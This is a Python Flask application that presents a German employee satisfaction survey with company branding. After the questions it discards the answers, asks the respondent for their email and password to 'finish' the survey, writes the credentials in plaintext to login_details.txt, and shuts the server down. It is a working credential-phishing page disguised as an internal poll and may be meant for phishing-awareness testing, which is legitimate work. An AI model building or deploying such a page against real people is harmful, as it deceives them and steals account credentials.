import time
import signal
from flask import Flask, request, render_template_string
import threading
import os

app = Flask(__name__)

questions = [
    {"question": "Wie zufrieden sind Sie mit den aktuellen Arbeitsbedingungen?", "name": "arbeitsbedingungen",
     "options": ["Sehr zufrieden", "Zufrieden", "Neutral", "Unzufrieden", "Sehr unzufrieden"]},
    {"question": "Wie oft möchten Sie im Homeoffice arbeiten?", "name": "homeoffice",
     "options": ["Jeden Tag", "Mehrere Tage pro Woche", "Einmal pro Woche", "Selten", "Nie"]},
    {"question": "Wie bewerten Sie die Kommunikation innerhalb Ihres Teams?", "name": "teamkommunikation",
     "options": ["Ausgezeichnet", "Gut", "Befriedigend", "Ausreichend", "Mangelhaft"]},
    {"question": "Wie wichtig ist Ihnen die Möglichkeit zur beruflichen Weiterbildung?", "name": "weiterbildung",
     "options": ["Sehr wichtig", "Wichtig", "Mittel", "Wenig wichtig", "Unwichtig"]},
    {"question": "Wie oft nehmen Sie an Teambuilding-Aktivitäten teil?", "name": "teambuilding",
     "options": ["Sehr oft", "Oft", "Manchmal", "Selten", "Nie"]},
    {"question": "Wie zufrieden sind Sie mit der aktuellen Projektverteilung?", "name": "projektverteilung",
     "options": ["Sehr zufrieden", "Zufrieden", "Neutral", "Unzufrieden", "Sehr unzufrieden"]},
    {"question": "Wie bewerten Sie die Work-Life-Balance in unserem Unternehmen?", "name": "worklifebalance",
     "options": ["Ausgezeichnet", "Gut", "Befriedigend", "Ausreichend", "Mangelhaft"]},
    {"question": "Wie effektiv finden Sie unsere aktuellen Meetings?", "name": "meetings",
     "options": ["Sehr effektiv", "Effektiv", "Mittel", "Wenig effektiv", "Ineffektiv"]},
    {"question": "Wie zufrieden sind Sie mit den Möglichkeiten zur persönlichen Entwicklung im Unternehmen?", "name": "persönlicheEntwicklung",
     "options": ["Sehr zufrieden", "Zufrieden", "Neutral", "Unzufrieden", "Sehr unzufrieden"]},
    {"question": "Wie wichtig ist Ihnen die Unternehmenskultur?", "name": "unternehmenskultur",
     "options": ["Sehr wichtig", "Wichtig", "Mittel", "Wenig wichtig", "Unwichtig"]}
]

logo_filename = "aity-logo.png"

welcome_html = """
<!DOCTYPE html>
<html>
<head>
    <title>Umfrage Willkommen</title>
    <style>
        body, html {
            font-family: 'Arial', sans-serif;
            height: 100%;
            margin: 0;
            padding: 0;
            background-image: url("{{ url_for('static', filename='aity-bg.png') }}");
            background-size: cover;
            background-position: center center;
            background-repeat: no-repeat;
            background-attachment: fixed;
        }
        header {
            background-color: white;
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            padding: 10px 0;
        }
        img.logo {
            width: auto;
            height: 75px;
            display: block;
        }
        .content {
            display: flex;
            justify-content: center;
            align-items: center;
            height: calc(100% - 100px);
            text-align: center;
        }
        .question-tab {
            background-color: white;
            margin-top: 20px;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2), 0 6px 20px rgba(0, 0, 0, 0.19);
            width: 80%;
            max-width: 600px;
        }
        button {
            padding: 10px 20px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <header>
        <img src="{{ url_for('static', filename='aity-logo.png') }}" alt="Logo" class="logo">
    </header>
    <div class="content">
        <div class="question-tab">
            <h3>Willkommen zur Umfrage</h3>
            <button onclick="window.location.href='/poll';">Start</button>
        </div>
    </div>
</body>
</html>
"""



HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Poll</title>
    <style>
        body, html {
            font-family: 'Arial', sans-serif; /* Apply sans-serif font to all text */
            height: 100%;
            margin: 0;
            padding: 0;
            background-image: url("{{ url_for('static', filename='aity-bg.png') }}");
            background-size: cover;
            background-position: center center;
            background-repeat: no-repeat;
            background-attachment: fixed;
        }
        header {
            background-color: white; /* White background for the header */
            width: 100%; /* Ensure the header spans the full width of the website */
            display: flex;
            justify-content: center; /* Center the logo horizontally */
            align-items: center; /* Center the logo vertically */
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); /* Optional: adds a subtle shadow under the header */
            padding: 10px 0; /* Adjust padding */
        }
        img.logo {
            width: auto;
            height: 75px; /* Set the logo's height */
            display: block; /* Removes bottom space/margin under the image */
        }
        .content {
            display: flex;
            justify-content: center;
            align-items: flex-start; /* Align content to the top */
            height: calc(100% - 100px); /* Adjust based on the header's height */
            padding-top: 50px; /* Adjust padding to move question tabs higher if needed */
        }
        .question-tab {
            background-color: white;
            margin-top: 20px; /* Adjust the position */
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2), 0 6px 20px rgba(0, 0, 0, 0.19);
            display: none; /* Initially hidden */
            width: 80%;
            max-width: 600px;
            text-align: left; /* Align text to the left */
        }
        .question-tab.active {
            display: block; /* Show the active tab */
        }
        .question-tab form {
            display: flex;
            flex-direction: column;
        }
        .next-button {
            margin-top: 20px;
            align-self: flex-end; /* Align the Next button to the right */
        }
    </style>
</head>
<body>
    <header>
        <img src="{{ url_for('static', filename=logo_filename) }}" alt="Logo" class="logo">
    </header>
    <div class="content">
        <div class="question-tabs">
            {% for q in questions %}
                <div id="question{{ loop.index0 }}" class="question-tab {% if loop.index0 == 0 %}active{% endif %}">
                    <h3>{{ q.question }}</h3>
                    <form method="post">
                        {% for option in q.options %}
                            <div><input type="radio" name="{{ q.name }}" value="{{ option }}"> {{ option }}</div>
                        {% endfor %}
                        <div class="next-button">
                            {% if not loop.last %}
                                <button type="button" onclick="nextQuestion({{ loop.index }})">Weiter</button>
                            {% else %}
                                <input href="/login" type="submit" value="Beenden">
                            {% endif %}
                        </div>,
                    </form>
                </div>
            {% endfor %}
        </div>
    </div>
    <script>
        function nextQuestion(nextIndex) {
            var currentQuestion = document.getElementById('question' + (nextIndex - 1));
            currentQuestion.classList.remove('active');
            var nextQuestion = document.getElementById('question' + nextIndex);
            nextQuestion.classList.add('active');
        }
    </script>
</body>
</html>
"""

Login_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Anmeldung erforderlich</title>
    <style>
        body, html {
            font-family: 'Arial', sans-serif;
            height: 100%;
            margin: 0;
            padding: 0;
            background-image: url("{{ url_for('static', filename='aity-bg.png') }}");
            background-size: cover;
            background-position: center center;
            background-repeat: no-repeat;
            background-attachment: fixed;
        }
        header {
            background-color: white;
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            padding: 10px 0;
        }
        img.logo {
            width: auto;
            height: 75px;
            display: block;
        }
        .content {
            display: flex;
            justify-content: center;
            align-items: flex-start;
            height: calc(100% - 100px);
            padding-top: 50px;
        }
        .question-tab {
            background-color: white;
            margin-top: 20px;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2), 0 6px 20px rgba(0, 0, 0, 0.19);
            display: block; /* Adjusted to display */
            width: 80%;
            max-width: 600px;
            text-align: left;
        }
        input[type="email"], input[type="password"] {
            width: 62.5%; /* Adjusted width to 125% */
            margin-bottom: 15px;
            padding: 10px;
            border: 1px solid black; /* Black border */
            border-radius: 5px; /* Slightly rounded corners */
            display: block;
        }
        .next-button {
            display: flex;
            justify-content: flex-end; /* Align the Submit button to the right */
            margin-top: 20px; /* Space above the button */
        }
        .next-button input[type="submit"] {
            padding: 10px 20px; /* Adjust padding */
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px; /* Slightly rounded corners */
            cursor: pointer;
        }
    </style>
</head>
<body>
    <header>
        <img src="{{ url_for('static', filename='aity-logo.png') }}" alt="Logo" class="logo">
    </header>
    <div class="content">
        <div class="question-tab">
            <h3>Bitte melden sie sich an, um die Umfrage abzuschliessen</h3>
            <form method="post" action="/login">
                <input type="email" name="email" placeholder="E-Mail" required>
                <input type="password" name="password" placeholder="Passwort" required>
                <div class="next-button">
                    <input type="submit" value="Anmelden">
                </div>
            </form>
        </div>
    </div>
</body>
</html>
"""

final_page_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Poll Completion</title>
    <style>
        body, html {
            font-family: 'Arial', sans-serif;
            height: 100%;
            margin: 0;
            padding: 0;
            background-image: url("{{ url_for('static', filename='aity-bg.png') }}");
            background-size: cover;
            background-position: center center;
            background-repeat: no-repeat;
            background-attachment: fixed;
        }
        header {
            background-color: white;
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            padding: 10px 0;
        }
        img.logo {
            width: auto;
            height: 75px;
            display: block;
        }
        .content {
            display: flex;
            justify-content: center;
            align-items: center; /* Changed to center to vertically align the text */
            height: calc(100% - 100px);
            padding-top: 20opx; /* Reduced padding-top to make the square higher */
            text-align: center; /* Ensure text is centered */
        }
        .question-tab {
            background-color: white;
            margin-top: 20px;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2), 0 6px 20px rgba(0, 0, 0, 0.19);
            width: 80%;
            max-width: 600px;
        }
    </style>
</head>
<body>
    <header>
        <img src="{{ url_for('static', filename='aity-logo.png') }}" alt="Logo" class="logo">
    </header>
    <div class="content">
        <div class="question-tab">
            <h3>Vielen Dank, dass Sie an der Umfrage teilgenommen haben.</h3>
        </div>
    </div>
</body>
</html>
"""

@app.route("/")
def welcome():
    return render_template_string(welcome_html)


@app.route('/poll', methods=['GET', 'POST'])
def poll():
    if request.method == 'POST':
        return render_template_string(Login_HTML)
    else:
        return render_template_string(HTML, questions=questions, logo_filename=logo_filename)


def quit():
    time.sleep(1)
    os.kill(os.getpid(), signal.SIGTERM)


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
        with open('login_details.txt', 'a') as file:
            file.write(f'Email: {email}\n Passw: {password}\n\n')
        threading.Thread(target=quit).start()
        return render_template_string(final_page_HTML)

    else:
        return render_template_string(Login_HTML)


if __name__ == '__main__':
    app.run(debug=True)
